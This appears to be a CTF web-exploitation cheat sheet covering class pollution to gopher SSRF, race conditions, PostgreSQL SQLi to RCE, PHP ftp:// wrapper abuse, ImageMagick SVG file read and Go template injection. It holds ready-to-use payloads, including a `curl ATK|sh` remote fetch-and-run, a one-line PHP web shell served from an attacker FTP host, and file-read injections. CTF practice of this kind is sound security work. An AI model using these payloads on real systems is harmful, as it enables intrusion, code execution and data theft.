- sources: https://blog.huli.tw/2024/06/28/en/google-ctf-2024-writeup/, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md, https://blog.elmosalamy.com/posts/htb-cyber-apocalypse-2025-writeup/

## Class/prototype pollution -> SSRF gopher to internal gRPC
- category: web
- signal: User JSON merged into object/class attrs (Ruby class.superclass / Python __class__ chain); internal-only service on a high port (gRPC 50051).
- technique: Pollute a config attr (realm_url) via the class/superclass chain, point it at gopher:// to send raw bytes (HTTP2/gRPC frame) to the internal service.
- tool/command: {"class":{"superclass":{"realm_url":"gopher://127.0.0.1:50051/_<urlenc HTTP2/gRPC frame bytes>"}}}
- gotchas: gopher payload must be fully URL-encoded raw bytes; curl supports gopher:// for raw TCP. Build the gRPC/HTTP2 frame offline. SSRF filters often miss gopher.
- frequency: med
- depth: deep
- sources: https://blog.elmosalamy.com/posts/htb-cyber-apocalypse-2025-writeup/

## Race condition (limit overrun / single-packet)
- category: web
- signal: Per-user limit reused concurrently: coupon/giftcard redeem, balance transfer, vote, OTP, account verification. Single request changes state (TOCTOU).
- technique: Fire many identical requests so they all read pre-update state before any commits. Use Burp Turbo Intruder single-packet (HTTP/2) for sub-ms alignment.
- tool/command: Turbo Intruder: engine=Engine.BURP2, concurrentConnections=1; queue 20-30 reqs to a gate then engine.openGate(). Or Repeater: group tabs -> 'Send group in parallel (single-packet)'.
- gotchas: Single-packet needs HTTP/2 and payload <1500 bytes (fragment larger). HTTP/1 fallback = last-byte sync. Warm the connection first. Send 20-30 not 2. Useless if backend uses DB row locks/atomic ops.
- frequency: med
- depth: deep
- sources: https://portswigger.net/web-security/race-conditions, https://swisskyrepo.github.io/PayloadsAllTheThings/Race%20Condition/

## WebSocket client-logic bypass
- category: web
- signal: Game/score/auth logic runs over WebSocket; client enforces rules the server trusts. picoCTF-style.
- technique: Open the socket in devtools and send raw messages the UI would never allow (negative/huge/out-of-range values).
- tool/command: ws.send('eval -133337')  (out-of-range value to trip win condition)
- gotchas: Find ws URL + message format in JS source / Network tab. Server may validate some fields but not others - probe each.
- frequency: low
- depth: quick
- sources: https://blog.qz.sg/picoctf-2025-web-exploitation-writeups/

## PostgreSQL SQLi -> RCE via lo_export / COPY FROM PROGRAM
- category: web
- signal: UNION-capable SQLi on PostgreSQL, superuser, writable data dir. HTB Aurors Archive.
- technique: COPY ... FROM PROGRAM if allowed (simplest RCE). Else write a malicious .so and overwrite postgresql.conf (session_preload_libraries) via large objects, then pg_reload_conf().
- tool/command: COPY t FROM PROGRAM 'curl ATK|sh';   or: SELECT lo_from_bytea(1,decode('<hexconf>','hex')); SELECT lo_export(1,'/var/lib/postgresql/data/postgresql.conf'); SELECT lo_export(2,'/tmp/p.so'); SELECT pg_reload_conf();
- gotchas: Needs superuser + filesystem write. Match the .so to the Postgres major version / _PG_init symbol.
- frequency: low
- depth: deep
- sources: https://blog.elmosalamy.com/posts/htb-cyber-apocalypse-2025-writeup/

## PHP wrapper LFI/SSRF via ftp:// bypass
- category: web
- signal: file_get_contents on user URL gated by file_exists(); php:// and http:// blocked but FTP allowed. HTB Eldoria Panel.
- technique: Use ftp:// to an attacker FTP server (stat() works so file_exists passes) and serve a malicious file.
- tool/command: param=ftp://anonymous@ATTACKER/login.php  ; serve login.php: <?php echo `$_GET[1]`; ?>  (run python pyftpdlib anon server)
- gotchas: file_exists/stat works over ftp but not http -> that's the bypass. data:// and php://filter/convert are alt bypasses if allow_url_include on.
- frequency: low
- depth: deep
- sources: https://blog.elmosalamy.com/posts/htb-cyber-apocalypse-2025-writeup/
## ImageMagick SVG file-read via image-upload thumbnail (LFI)
- **signal:** upload returns a processed thumbnail; response header `x-processor: ImageMagick/...`; hint "Accepted: JPG/PNG/GIF/BMP" but server picks coder by FILE EXTENSION of the uploaded name.
- **technique:** server saves your upload then `convert <file> -thumbnail out.png` and returns out.png as `data:image/png;base64,...`. Upload body = malicious SVG, **filename must end `.svg`** (extension drives coder; `.png` name fails). SVG renders a local file into the image we get back:
  `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="900" height="120"><rect width="900" height="120" fill="white"/><image xlink:href="caption:@/flag.txt" width="900" height="120"/></svg>`
  - `text:/flag.txt` or `caption:@/flag.txt` or `label:@/flag.txt` — caption auto-sizes font (most readable). Decode the returned base64 PNG and READ it (OCR is lossy on case/leet/apostrophes — view the image).
- **tool:** `requests.post(url+'/upload', files={'file':('x.svg', svg_body,'image/svg+xml')})` → regex `src="data:image/png;base64,([^"]+)"` → base64 -d → view PNG.
- **gotchas:** filename ext is the coder selector (NOT the multipart content-type, NOT the filename-as-coder trick). Render is intermittent — retry. Read the rendered text by EYE (apostrophe `I'v3` vs `Iv3` cost a wrong submit). 
- **source:** boroCTF 2026 "Kobeni's Dashboard" (web 200) → CTF{REDACTED}

## SSTI — Go text/template → arbitrary file read via {{.File}}
- category: web
- signal: a request param is REFLECTED back into the HTML response (echoed in a `value="..."`, breadcrumb, error, etc.). App is Go (`x-powered-by: Echo`, `Server` hints). Decoy "path traversal / dir-listing / static" features that won't read files are the misdirect.
- technique: confirm template injection FIRST, then escalate. `{{.}}` dumps the data root; if it's an `echo.Context` (struct dump shows `map[...]` query + ptrs), call its methods. `echo.Context.File(name)` uses Echo's DEFAULT filesystem whose `Open` calls `os.Open(name)` directly — NO `..`/absolute clamp → reads ANY path. `.File` streams the file into the response body (appears at the TOP, before the page HTML).
- tool/command:
  ```
  # 1) detect injection (escape vs eval)
  curl -G "$U/" --data-urlencode 'path=<u>x</u>'                 # &lt; = escaped (html/template) ; raw < = XSS
  curl -G "$U/" --data-urlencode 'path={{printf "%s" "ssti"}}'   # prints ssti => text/template SSTI
  curl -G "$U/" --data-urlencode 'path={{.}}'                    # dump data root (echo.Context struct)
  # 2) read the flag
  curl -G "$U/" --data-urlencode 'path={{.File "/flag.txt"}}'    # flag streamed at top of response
  ```
- gotchas: `{{7*7}}` does NOT work in Go templates (no infix math) — use `{{printf}}` / method calls to confirm. Go text/template can't do arbitrary RCE by default; you exploit the METHODS on whatever `.` is. Other echo.Context reads: `{{.Render}}`, `{{.Attachment "/flag.txt" "f"}}`, `{{.Inline}}`. html/template auto-escapes output but STILL executes `.File` side-effects. META-LESSON: reflected input → test `{{}}`/injection within the first few minutes, before grinding traversal/static.
- frequency: medium
- sources: CNCC 2026 "Can see, Can't have" (web 250, author vivi) → MPTC{REDACTED}

---
## Go text/template SSTI via Echo Context

**Signal**: Go/Echo server, user-controlled `path` parameter executed as template, error format `"template: path:1: ..."` confirming template parsing  
**Technique**: Server passes user input to `template.New("path").Parse(userInput)` and executes it with `echo.Context` as the data object. Since `echo.Context` is passed as `.`, all its exported methods are callable from the template.  
**Tool-command**: `/?path={{.File "/flag.txt"}}` (URL-encode quotes: `%22`)  
**Payload**: `{{.File%20%22/flag.txt%22}}` — calls `c.File("/flag.txt")` which serves the flag file as the HTTP response before the HTML page renders  
**Detection**: Try `/?path={{7*7}}` — get `template: path:1: unexpected "*"` error = confirmed SSTI  
**Data dump**: `/?path={{.}}` dumps the template data object (reveals echo.Context struct)  
**Gotchas**: Quotes in URL must be `%22`; space must be `%20`. `File()` writes directly to response writer, so the first HTTP response body is the file content (clean, 34 bytes), no HTML noise. Other useful methods: `.String 200 "data"`, `.Attachment "/file" "name"`, `.HTML 200 "<b>html</b>"`  
**Sources**: challenge "Can see, Can't have" MPTC/CNCC 2026, author vivi
